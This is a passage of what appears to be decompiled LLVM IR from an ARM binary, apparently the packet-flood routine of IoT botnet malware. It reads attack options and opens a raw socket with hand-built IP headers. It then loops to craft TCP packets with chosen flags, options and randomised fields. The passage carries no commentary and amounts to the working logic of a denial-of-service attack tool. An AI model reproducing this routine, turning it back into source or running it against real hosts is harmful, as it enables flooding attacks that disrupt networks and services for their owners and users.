  store i32 %v0_c248, i32* %r0.global-to-local, align 4
  %v5_c24c = inttoptr i32 %v0_c238 to i32*
  %v6_c24c = call i32 @attack_get_opt_int(i32 %v0_c248, i32* %v5_c24c, i32 4, i32 64)
  %v1_c254 = urem i32 %v6_c24c, 256
  %v0_c258 = load i32, i32* @r5, align 4
  store i32 %v0_c258, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c264 = load i32, i32* @r4, align 4
  store i32 %v0_c264, i32* %r0.global-to-local, align 4
  %v6_c26c = inttoptr i32 %v0_c258 to i32*
  %v7_c26c = call i32 @attack_get_opt_int(i32 %v0_c264, i32* %v6_c26c, i32 5, i32 1)
  %v1_c278 = urem i32 %v7_c26c, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c284 = load i32, i32* @r5, align 4
  store i32 %v0_c284, i32* %r1.global-to-local, align 4
  %v0_c288 = load i32, i32* @r4, align 4
  store i32 %v0_c288, i32* %r0.global-to-local, align 4
  %v5_c290 = inttoptr i32 %v0_c284 to i32*
  %v6_c290 = call i32 @attack_get_opt_int(i32 %v0_c288, i32* %v5_c290, i32 6, i32 65535)
  %v0_c298 = load i32, i32* @r5, align 4
  store i32 %v0_c298, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_c290, i32* %fp.global-to-local, align 4
  %v0_c2a8 = load i32, i32* @r4, align 4
  store i32 %v0_c2a8, i32* %r0.global-to-local, align 4
  %v4_c2ac = inttoptr i32 %v0_c298 to i32*
  %v5_c2ac = call i32 @attack_get_opt_int(i32 %v0_c2a8, i32* %v4_c2ac, i32 7, i32 65535)
  %v0_c2b4 = load i32, i32* @r5, align 4
  store i32 %v0_c2b4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_c2ac, i32* @r6, align 4
  %v0_c2c4 = load i32, i32* @r4, align 4
  store i32 %v0_c2c4, i32* %r0.global-to-local, align 4
  %v4_c2c8 = inttoptr i32 %v0_c2b4 to i32*
  %v5_c2c8 = call i32 @attack_get_opt_int(i32 %v0_c2c4, i32* %v4_c2c8, i32 17, i32 65535)
  %v0_c2cc = load i32, i32* @r5, align 4
  store i32 %v0_c2cc, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2dc = load i32, i32* @r4, align 4
  store i32 %v0_c2dc, i32* %r0.global-to-local, align 4
  %v5_c2e0 = inttoptr i32 %v0_c2cc to i32*
  %v6_c2e0 = call i32 @attack_get_opt_int(i32 %v0_c2dc, i32* %v5_c2e0, i32 18, i32 0)
  %v0_c2e4 = load i32, i32* @r5, align 4
  store i32 %v0_c2e4, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2f4 = load i32, i32* @r4, align 4
  store i32 %v0_c2f4, i32* %r0.global-to-local, align 4
  %v5_c2f8 = inttoptr i32 %v0_c2e4 to i32*
  %v6_c2f8 = call i32 @attack_get_opt_int(i32 %v0_c2f4, i32* %v5_c2f8, i32 11, i32 0)
  %v0_c2fc = load i32, i32* @r5, align 4
  store i32 %v0_c2fc, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c30c = load i32, i32* @r4, align 4
  store i32 %v0_c30c, i32* %r0.global-to-local, align 4
  %v5_c310 = inttoptr i32 %v0_c2fc to i32*
  %v6_c310 = call i32 @attack_get_opt_int(i32 %v0_c30c, i32* %v5_c310, i32 12, i32 0)
  %v0_c314 = load i32, i32* @r5, align 4
  store i32 %v0_c314, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c324 = load i32, i32* @r4, align 4
  store i32 %v0_c324, i32* %r0.global-to-local, align 4
  %v5_c328 = inttoptr i32 %v0_c314 to i32*
  %v6_c328 = call i32 @attack_get_opt_int(i32 %v0_c324, i32* %v5_c328, i32 13, i32 0)
  %v0_c32c = load i32, i32* @r5, align 4
  store i32 %v0_c32c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c33c = load i32, i32* @r4, align 4
  store i32 %v0_c33c, i32* %r0.global-to-local, align 4
  %v5_c340 = inttoptr i32 %v0_c32c to i32*
  %v6_c340 = call i32 @attack_get_opt_int(i32 %v0_c33c, i32* %v5_c340, i32 14, i32 0)
  %v0_c344 = load i32, i32* @r5, align 4
  store i32 %v0_c344, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c354 = load i32, i32* @r4, align 4
  store i32 %v0_c354, i32* %r0.global-to-local, align 4
  %v5_c358 = inttoptr i32 %v0_c344 to i32*
  %v6_c358 = call i32 @attack_get_opt_int(i32 %v0_c354, i32* %v5_c358, i32 15, i32 1)
  %v0_c35c = load i32, i32* @r5, align 4
  store i32 %v0_c35c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c36c = load i32, i32* @r4, align 4
  store i32 %v0_c36c, i32* %r0.global-to-local, align 4
  %v5_c370 = inttoptr i32 %v0_c35c to i32*
  %v6_c370 = call i32 @attack_get_opt_int(i32 %v0_c36c, i32* %v5_c370, i32 16, i32 0)
  %v2_c37c = load i32, i32* @global_var_241f0.57, align 4
  store i32 %v2_c37c, i32* %r3.global-to-local, align 4
  %v0_c380 = load i32, i32* @r5, align 4
  store i32 %v0_c380, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c388 = load i32, i32* @r4, align 4
  store i32 %v0_c388, i32* %r0.global-to-local, align 4
  %v5_c38c = inttoptr i32 %v0_c380 to i32*
  %v6_c38c = call i32 @attack_get_opt_ip(i32 %v0_c388, i32* %v5_c38c, i32 25, i32 %v2_c37c, i32 %v6_c370)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c3a0 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_c3a0, i32* %r0.global-to-local, align 4
  %v7_c3a4 = icmp eq i32 %v3_c3a0, -1
  store i1 %v7_c3a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c3a0, i32* @sl, align 4
  br i1 %v7_c3a4, label %dec_label_pc_c878, label %dec_label_pc_c3b0

dec_label_pc_c3b0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c3b8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c3b8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c3cc = call i32 @__GI_setsockopt(i32 %v3_c3a0, i32 0, i32 3, i32 %v6_c3b8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_c3cc, i32* %r0.global-to-local, align 4
  %v7_c3d0 = icmp eq i32 %v5_c3cc, -1
  store i1 %v7_c3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3d0, label %dec_label_pc_c870, label %dec_label_pc_c3d8

dec_label_pc_c3d8:                                ; preds = %dec_label_pc_c3b0
  %v3_c3e0 = mul i32 %v7_c234, 65536
  store i32 %v3_c3e0, i32* %r0.global-to-local, align 4
  %v0_c3e4 = load i32, i32* %fp.global-to-local, align 4
  %v3_c3e4 = mul i32 %v0_c3e4, 65536
  store i32 %v3_c3e4, i32* %r4.global-to-local, align 4
  %v0_c3e8 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_c2f8, i32* %r2.global-to-local, align 4
  %v3_c3f4 = urem i32 %v7_c234, 65536
  store i32 %v3_c3f4, i32* %r3.global-to-local, align 4
  %v3_c3f8 = urem i32 %v0_c3e4, 65536
  %v3_c3fc = urem i32 %v0_c3e8, 65536
  store i32 %v3_c3fc, i32* %r1.global-to-local, align 4
  %v0_c400 = load i32, i32* @r7, align 4
  %v2_c400 = icmp eq i32 %v0_c400, 0
  store i1 %v2_c400, i1* %cpsr_z.global-to-local, align 1
  %v1_c410 = urem i32 %v6_c2f8, 256
  store i32 %v1_c410, i32* @fp, align 4
  br i1 %v2_c400, label %dec_label_pc_c664.preheader, label %dec_label_pc_c418

dec_label_pc_c418:                                ; preds = %dec_label_pc_c3d8
  %tmp52 = mul i32 %v5_c2c8, 256
  %v3_c430 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v7_c234, 256
  %v3_c434 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v5_c2c8, 256
  %v4_c43c = urem i32 %tmp54, 256
  %v5_c43c = or i32 %v4_c43c, %v3_c430
  store i32 %v5_c43c, i32* @lr, align 4
  %v1_c438 = mul i32 %v7_c234, 256
  %v4_c440 = and i32 %v1_c438, 65280
  %v5_c440 = or i32 %v4_c440, %v3_c434
  %tmp55 = mul i32 %v0_c3e4, 256
  %v3_c44c = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_c3e8, 256
  %v3_c450 = and i32 %tmp56, 65280
  %v1_c454 = urem i32 %v6_c2f8, 2
  %v1_c458 = urem i32 %v6_c310, 2
  %tmp57 = udiv i32 %v0_c3e4, 256
  %v4_c45c = urem i32 %tmp57, 256
  %v5_c45c = or i32 %v4_c45c, %v3_c44c
  store i32 %v5_c45c, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_c3e8, 256
  %v4_c460 = urem i32 %tmp58, 256
  %v5_c460 = or i32 %v4_c460, %v3_c450
  store i32 %v5_c460, i32* @r5, align 4
  %v1_c47c = urem i32 %v6_c328, 2
  store i32 %v1_c47c, i32* %r2.global-to-local, align 4
  %v1_c480 = urem i32 %v6_c340, 2
  store i32 %v1_c480, i32* %r3.global-to-local, align 4
  %v1_c484 = urem i32 %v6_c358, 2
  store i32 %v1_c484, i32* %r0.global-to-local, align 4
  %v1_c488 = urem i32 %v6_c370, 2
  store i32 %v1_c488, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext4 = mul nuw i32 %v5_c440, 65536
  %v4_c510 = sdiv i32 %sext4, 65536
  %tmp = sub nsw i32 0, %v1_c458
  %v4_c574 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_c47c
  %v4_c588 = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_c480
  %v4_c5a0 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_c484
  %v3_c5b4 = and i32 %tmp64, 2
  %v1_c504 = trunc i32 %v6_c24c to i8
  br label %dec_label_pc_c4a8

dec_label_pc_c4a8:                                ; preds = %bb61, %dec_label_pc_c418
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_c4b0 = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_c4b0, i32* %r0.global-to-local, align 4
  %v3_c4b4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c4b4, i32* %r2.global-to-local, align 4
  %v1_c4b8 = load i32, i32* @sb, align 4
  %v2_c4b8 = load i32, i32* @r4, align 4
  %v5_c4b8 = mul i32 %v2_c4b8, 4
  %v6_c4b8 = add i32 %v5_c4b8, %v1_c4b8
  %v7_c4b8 = inttoptr i32 %v6_c4b8 to i32*
  store i32 %v2_c4b0, i32* %v7_c4b8, align 4
  %v0_c4bc = load i32, i32* %r2.global-to-local, align 4
  %v3_c4bc = mul i32 %v0_c4bc, 32
  store i32 %v3_c4bc, i32* %r3.global-to-local, align 4
  %v0_c4c0 = load i32, i32* @sb, align 4
  %v4_c4c0 = mul i32 %v0_c4bc, 4
  %v5_c4c0 = add i32 %v0_c4c0, %v4_c4c0
  %v6_c4c0 = inttoptr i32 %v5_c4c0 to i32*
  %v7_c4c0 = load i32, i32* %v6_c4c0, align 4
  store i32 %v7_c4c0, i32* %r4.global-to-local, align 4
  %v5_c4c4 = mul i32 %v0_c4bc, 24
  store i32 %v5_c4c4, i32* %r3.global-to-local, align 4
  %v1_c4c8 = load i32, i32* @r8, align 4
  %v2_c4c8 = add i32 %v1_c4c8, %v5_c4c4
  store i32 %v2_c4c8, i32* %r0.global-to-local, align 4
  %v1_c4cc = inttoptr i32 %v7_c4c0 to i8*
  %v2_c4cc = load i8, i8* %v1_c4cc, align 1
  %tmp65 = urem i8 %v2_c4cc, 16
  %v1_c4d0 = zext i8 %tmp65 to i32
  %v1_c4d4 = or i32 %v1_c4d0, 64
  store i32 %v1_c4d4, i32* %r3.global-to-local, align 4
  %v1_c4d8 = trunc i32 %v1_c4d4 to i8
  store i8 %v1_c4d8, i8* %v1_c4cc, align 1
  %v0_c4dc = load i32, i32* %r4.global-to-local, align 4
  %v1_c4dc = inttoptr i32 %v0_c4dc to i8*
  %v2_c4dc = load i8, i8* %v1_c4dc, align 1
  %v1_c4e0 = and i8 %v2_c4dc, -16
  %v1_c4e4 = or i8 %v1_c4e0, 5
  store i32 %v1_c278, i32* %r3.global-to-local, align 4
  store i8 %v1_c4e4, i8* %v1_c4dc, align 1
  %v2_c4f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_c4f4 = add i32 %v2_c4f4, 1
  %v4_c4f4 = inttoptr i32 %v3_c4f4 to i8*
  store i8 %v5_c230, i8* %v4_c4f4, align 1
  store i32 %v1_c254, i32* %r2.global-to-local, align 4
  %v0_c4fc = load i32, i32* %r3.global-to-local, align 4
  %v2_c4fc = icmp eq i32 %v0_c4fc, 0
  store i1 %v2_c4fc, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_c504 = load i32, i32* %r4.global-to-local, align 4
  %v3_c504 = add i32 %v2_c504, 8
  %v4_c504 = inttoptr i32 %v3_c504 to i8*
  store i8 %v1_c504, i8* %v4_c504, align 1
  %v0_c508 = load i32, i32* %r3.global-to-local, align 4
  %v1_c508 = trunc i32 %v0_c508 to i16
  %v2_c508 = load i32, i32* %r4.global-to-local, align 4
  %v3_c508 = add i32 %v2_c508, 2
  %v4_c508 = inttoptr i32 %v3_c508 to i16*
  store i16 %v1_c508, i16* %v4_c508, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_c510, i32* %r1.global-to-local, align 4
  %v0_c514 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c514, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_c4a8
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_c4a8, %bb
  %v2_c518 = load i32, i32* %r4.global-to-local, align 4
  %v3_c518 = add i32 %v2_c518, 9
  %v4_c518 = inttoptr i32 %v3_c518 to i8*
  store i8 6, i8* %v4_c518, align 1
  %v0_c51c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c51c, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_c51c = load i32, i32* %r2.global-to-local, align 4
  %v2_c51c = trunc i32 %v1_c51c to i16
  %v3_c51c = load i32, i32* %r4.global-to-local, align 4
  %v4_c51c = add i32 %v3_c51c, 6
  %v5_c51c = inttoptr i32 %v4_c51c to i16*
  store i16 %v2_c51c, i16* %v5_c51c, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_c38c, i32* %r2.global-to-local, align 4
  %v1_c524 = load i32, i32* %r4.global-to-local, align 4
  %v2_c524 = add i32 %v1_c524, 12
  %v3_c524 = inttoptr i32 %v2_c524 to i32*
  store i32 %v6_c38c, i32* %v3_c524, align 4
  %v0_c528 = load i32, i32* %r0.global-to-local, align 4
  %v1_c528 = add i32 %v0_c528, 16
  %v2_c528 = inttoptr i32 %v1_c528 to i32*
  %v3_c528 = load i32, i32* %v2_c528, align 4
  store i32 %v3_c528, i32* %r3.global-to-local, align 4
  %v0_c52c = load i32, i32* %r1.global-to-local, align 4
  %v1_c52c = trunc i32 %v0_c52c to i16
  %v2_c52c = load i32, i32* %r4.global-to-local, align 4
  %v3_c52c = add i32 %v2_c52c, 4
  %v4_c52c = inttoptr i32 %v3_c52c to i16*
  store i16 %v1_c52c, i16* %v4_c52c, align 2
  %v0_c530 = load i32, i32* %r3.global-to-local, align 4
  %v1_c530 = load i32, i32* %r4.global-to-local, align 4
  %v2_c530 = add i32 %v1_c530, 16
  %v3_c530 = inttoptr i32 %v2_c530 to i32*
  store i32 %v0_c530, i32* %v3_c530, align 4
  %v0_c534 = load i32, i32* @r6, align 4
  %v1_c534 = trunc i32 %v0_c534 to i16
  %v2_c534 = load i32, i32* %r4.global-to-local, align 4
  %v3_c534 = add i32 %v2_c534, 20
  %v4_c534 = inttoptr i32 %v3_c534 to i16*
  store i16 %v1_c534, i16* %v4_c534, align 2
  %v0_c538 = load i32, i32* %r4.global-to-local, align 4
  %v1_c538 = add i32 %v0_c538, 20
  store i32 %v1_c538, i32* %r1.global-to-local, align 4
  %v1_c53c = add i32 %v0_c538, 32
  %v2_c53c = inttoptr i32 %v1_c53c to i8*
  %v3_c53c = load i8, i8* %v2_c53c, align 1
  %v4_c53c = zext i8 %v3_c53c to i32
  store i32 %v4_c53c, i32* %r3.global-to-local, align 4
  %v1_c540 = add i32 %v0_c538, 33
  %v2_c540 = inttoptr i32 %v1_c540 to i8*
  %v3_c540 = load i8, i8* %v2_c540, align 1
  %v4_c540 = zext i8 %v3_c540 to i32
  store i32 %v1_c454, i32* %r0.global-to-local, align 4
  %v1_c548 = urem i8 %v3_c53c, 16
  %v1_c54c = or i8 %v1_c548, -96
  %v1_c550 = and i32 %v4_c540, 223
  store i32 %v1_c550, i32* %r2.global-to-local, align 4
  store i8 %v1_c54c, i8* %v2_c53c, align 1
  %v0_c558 = load i32, i32* %r2.global-to-local, align 4
  %v1_c558 = load i32, i32* %r0.global-to-local, align 4
  %v4_c558 = mul i32 %v1_c558, 32
  %v5_c558 = or i32 %v4_c558, %v0_c558
  store i32 %v5_c558, i32* %r2.global-to-local, align 4
  store i32 %v5_c43c, i32* %r3.global-to-local, align 4
  %v1_c560 = trunc i32 %v5_c558 to i8
  %v2_c560 = load i32, i32* %r1.global-to-local, align 4
  %v3_c560 = add i32 %v2_c560, 13
  %v4_c560 = inttoptr i32 %v3_c560 to i8*
  store i8 %v1_c560, i8* %v4_c560, align 1
  %v0_c564 = load i32, i32* %r3.global-to-local, align 4
  %v1_c564 = load i32, i32* %r1.global-to-local, align 4
  %v2_c564 = add i32 %v1_c564, 4
  %v3_c564 = inttoptr i32 %v2_c564 to i32*
  store i32 %v0_c564, i32* %v3_c564, align 4
  %v0_c568 = load i32, i32* %r1.global-to-local, align 4
  %v1_c568 = add i32 %v0_c568, 13
  %v2_c568 = inttoptr i32 %v1_c568 to i8*
  %v3_c568 = load i8, i8* %v2_c568, align 1
  %v4_c568 = zext i8 %v3_c568 to i32
  store i32 %v1_c458, i32* %r0.global-to-local, align 4
  %v1_c570 = and i32 %v4_c568, 239
  %v5_c574 = or i32 %v1_c570, %v4_c574
  store i32 %v5_c574, i32* %r3.global-to-local, align 4
  %v1_c578 = trunc i32 %v5_c574 to i8
  store i8 %v1_c578, i8* %v2_c568, align 1
  %v0_c57c = load i32, i32* %r1.global-to-local, align 4
  %v1_c57c = add i32 %v0_c57c, 13
  %v2_c57c = inttoptr i32 %v1_c57c to i8*
  %v3_c57c = load i8, i8* %v2_c57c, align 1
  %v4_c57c = zext i8 %v3_c57c to i32
  store i32 %v1_c47c, i32* %r3.global-to-local, align 4
  %v1_c584 = and i32 %v4_c57c, 247
  %v5_c588 = or i32 %v1_c584, %v4_c588
  store i32 %v5_c588, i32* %r2.global-to-local, align 4
  %v0_c58c = load i32, i32* @r5, align 4
  %v1_c58c = trunc i32 %v0_c58c to i16
  %v3_c58c = add i32 %v0_c57c, 2
  %v4_c58c = inttoptr i32 %v3_c58c to i16*
  store i16 %v1_c58c, i16* %v4_c58c, align 2
  %v0_c590 = load i32, i32* %r2.global-to-local, align 4
  %v1_c590 = trunc i32 %v0_c590 to i8
  %v2_c590 = load i32, i32* %r1.global-to-local, align 4
  %v3_c590 = add i32 %v2_c590, 13
  %v4_c590 = inttoptr i32 %v3_c590 to i8*
  store i8 %v1_c590, i8* %v4_c590, align 1
  %v0_c594 = load i32, i32* %r1.global-to-local, align 4
  %v1_c594 = add i32 %v0_c594, 13
  %v2_c594 = inttoptr i32 %v1_c594 to i8*
  %v3_c594 = load i8, i8* %v2_c594, align 1
  %v4_c594 = zext i8 %v3_c594 to i32
  store i32 %v1_c480, i32* %r0.global-to-local, align 4
  %v1_c59c = and i32 %v4_c594, 251
  %v5_c5a0 = or i32 %v1_c59c, %v4_c5a0
  store i32 %v5_c5a0, i32* %r3.global-to-local, align 4
  %v1_c5a4 = trunc i32 %v5_c5a0 to i8
  store i8 %v1_c5a4, i8* %v2_c594, align 1
  %v0_c5a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5a8 = add i32 %v0_c5a8, 13
  %v2_c5a8 = inttoptr i32 %v1_c5a8 to i8*
  %v3_c5a8 = load i8, i8* %v2_c5a8, align 1
  %v4_c5a8 = zext i8 %v3_c5a8 to i32
  store i32 %v1_c484, i32* %r3.global-to-local, align 4
  %v1_c5b0 = and i32 %v4_c5a8, 253
  %v4_c5b4 = or i32 %v1_c5b0, %v3_c5b4
  store i32 %v4_c5b4, i32* %r2.global-to-local, align 4
  %v1_c5b8 = trunc i32 %v4_c5b4 to i8
  store i8 %v1_c5b8, i8* %v2_c5a8, align 1
  %v0_c5bc = load i32, i32* %r1.global-to-local, align 4
  %v1_c5bc = add i32 %v0_c5bc, 13
  %v2_c5bc = inttoptr i32 %v1_c5bc to i8*
  %v3_c5bc = load i8, i8* %v2_c5bc, align 1
  %v4_c5bc = zext i8 %v3_c5bc to i32
  store i32 %v1_c488, i32* %r0.global-to-local, align 4
  %v1_c5c4 = and i32 %v4_c5bc, 254
  %v2_c5c8 = or i32 %v1_c5c4, %v1_c488
  store i32 %v2_c5c8, i32* %r3.global-to-local, align 4
  %v1_c5cc = trunc i32 %v2_c5c8 to i8
  store i8 %v1_c5cc, i8* %v2_c5bc, align 1
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_c5d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5d8 = add i32 %v2_c5d8, 40
  %v4_c5d8 = inttoptr i32 %v3_c5d8 to i8*
  store i8 2, i8* %v4_c5d8, align 1
  %v0_c5dc = load i32, i32* %r2.global-to-local, align 4
  %v1_c5dc = trunc i32 %v0_c5dc to i8
  %v2_c5dc = load i32, i32* %r4.global-to-local, align 4
  %v3_c5dc = add i32 %v2_c5dc, 41
  %v4_c5dc = inttoptr i32 %v3_c5dc to i8*
  store i8 %v1_c5dc, i8* %v4_c5dc, align 1
  %v0_c5e0 = call i32 @rand_next()
  %v1_c5e4 = urem i32 %v0_c5e0, 16
  %v1_c5e8 = or i32 %v1_c5e4, 1392
  %tmp66 = mul nuw nsw i32 %v1_c5e8, 256
  %v3_c5f4 = add nuw nsw i32 %tmp66, 2048
  %v1_c5f8 = and i32 %v3_c5f4, ptrtoint (i32* @global_var_ff00.32 to i32)
  %v5_c5fc = or i32 %v1_c5f8, 5
  %v1_c600 = trunc i32 %v5_c5fc to i16
  %v2_c600 = load i32, i32* %r4.global-to-local, align 4
  %v3_c600 = add i32 %v2_c600, 42
  %v4_c600 = inttoptr i32 %v3_c600 to i16*
  store i16 %v1_c600, i16* %v4_c600, align 2
  %v2_c608 = load i32, i32* %r4.global-to-local, align 4
  %v3_c608 = add i32 %v2_c608, 44
  %v4_c608 = inttoptr i32 %v3_c608 to i8*
  store i8 4, i8* %v4_c608, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_c618 = load i32, i32* %r4.global-to-local, align 4
  %v3_c618 = add i32 %v2_c618, 46
  %v4_c618 = inttoptr i32 %v3_c618 to i8*
  store i8 8, i8* %v4_c618, align 1
  %v0_c61c = load i32, i32* %r2.global-to-local, align 4
  %v1_c61c = trunc i32 %v0_c61c to i8
  %v2_c61c = load i32, i32* %r4.global-to-local, align 4
  %v3_c61c = add i32 %v2_c61c, 47
  %v4_c61c = inttoptr i32 %v3_c61c to i8*
  store i8 %v1_c61c, i8* %v4_c61c, align 1
  %v0_c620 = load i32, i32* %r0.global-to-local, align 4
  %v1_c620 = trunc i32 %v0_c620 to i8
  %v2_c620 = load i32, i32* %r4.global-to-local, align 4
  %v3_c620 = add i32 %v2_c620, 45
  %v4_c620 = inttoptr i32 %v3_c620 to i8*
  store i8 %v1_c620, i8* %v4_c620, align 1
  %v0_c624 = call i32 @rand_next()
  store i32 %v0_c624, i32* %r0.global-to-local, align 4
  %v2_c62c = load i32, i32* %r4.global-to-local, align 4
  %v3_c62c = add i32 %v2_c62c, 59
  %v4_c62c = inttoptr i32 %v3_c62c to i8*
  store i8 6, i8* %v4_c62c, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_c63c = load i32, i32* %r4.global-to-local, align 4
  %v2_c63c = add i32 %v1_c63c, 48
  %v3_c63c = inttoptr i32 %v2_c63c to i32*
  store i32 %v0_c624, i32* %v3_c63c, align 4
  %v0_c640 = load i32, i32* %r3.global-to-local, align 4
  %v1_c640 = load i32, i32* %r4.global-to-local, align 4
  %v2_c640 = add i32 %v1_c640, 52
  %v3_c640 = inttoptr i32 %v2_c640 to i32*
  store i32 %v0_c640, i32* %v3_c640, align 4
  %v0_c644 = load i32, i32* %r2.global-to-local, align 4
  %v1_c644 = trunc i32 %v0_c644 to i8
  %v2_c644 = load i32, i32* %r4.global-to-local, align 4
  %v3_c644 = add i32 %v2_c644, 56
  %v4_c644 = inttoptr i32 %v3_c644 to i8*
  store i8 %v1_c644, i8* %v4_c644, align 1
  %v0_c648 = load i32, i32* %r1.global-to-local, align 4
  %v1_c648 = trunc i32 %v0_c648 to i8
  %v2_c648 = load i32, i32* %r4.global-to-local, align 4
  %v3_c648 = add i32 %v2_c648, 58
  %v4_c648 = inttoptr i32 %v3_c648 to i8*
  store i8 %v1_c648, i8* %v4_c648, align 1
  %v0_c64c = load i32, i32* %r1.global-to-local, align 4
  %v1_c64c = trunc i32 %v0_c64c to i8
  %v2_c64c = load i32, i32* %r4.global-to-local, align 4
  %v3_c64c = add i32 %v2_c64c, 57
  %v4_c64c = inttoptr i32 %v3_c64c to i8*
  store i8 %v1_c64c, i8* %v4_c64c, align 1
  %v3_c650 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c650, i32* %r3.global-to-local, align 4
  %v1_c654 = load i32, i32* %r2.global-to-local, align 4
  %v2_c654 = add i32 %v1_c654, %v3_c650
  store i32 %v2_c654, i32* @r4, align 4
  %v1_c658 = load i32, i32* @r7, align 4
  %v9_c658 = icmp eq i32 %v2_c654, %v1_c658
  store i1 %v9_c658, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_c654, i32* %stack_var_-44, align 4
  %v5_c660 = icmp slt i32 %v2_c654, %v1_c658
  br i1 %v5_c660, label %dec_label_pc_c4a8, label %dec_label_pc_c664.preheader

dec_label_pc_c664.preheader:                      ; preds = %bb61, %dec_label_pc_c3d8
  %v0_c6686 = phi i32 [ 0, %dec_label_pc_c3d8 ], [ %v1_c658, %bb61 ]
  %v3_c7e0 = icmp eq i32 %v6_c38c, -1
  %v8_c7e0 = icmp eq i32 %v6_c38c, -1
  %v3_c6b0 = icmp eq i32 %v3_c3f4, 65535
  br label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %dec_label_pc_c664, %dec_label_pc_c774, %dec_label_pc_c664.preheader
  %v0_c668 = phi i32 [ %v0_c6686, %dec_label_pc_c664.preheader ], [ 0, %dec_label_pc_c774 ], [ 0, %dec_label_pc_c664 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c668 = icmp eq i32 %v0_c668, 0
  store i1 %v2_c668, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c668, label %dec_label_pc_c664, label %dec_label_pc_c674

dec_label_pc_c674:                                ; preds = %dec_label_pc_c664, %dec_label_pc_c774
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c678

dec_label_pc_c678:                                ; preds = %dec_label_pc_c6f0, %dec_label_pc_c674
  %v1_c688 = phi i32 [ %v1_c764, %dec_label_pc_c6f0 ], [ 0, %dec_label_pc_c674 ]
  %v5_c67c = mul i32 %v1_c688, 24
  %v1_c680 = load i32, i32* @r8, align 4
  %v2_c680 = add i32 %v1_c680, %v5_c67c
  store i32 %v2_c680, i32* %r3.global-to-local, align 4
  %v1_c684 = add i32 %v2_c680, 20
  %v2_c684 = inttoptr i32 %v1_c684 to i8*
  %v3_c684 = load i8, i8* %v2_c684, align 1
  %v4_c684 = zext i8 %v3_c684 to i32
  store i32 %v4_c684, i32* %r2.global-to-local, align 4
  %v0_c688 = load i32, i32* @sb, align 4
  %v4_c688 = mul i32 %v1_c688, 4
  %v5_c688 = add i32 %v0_c688, %v4_c688
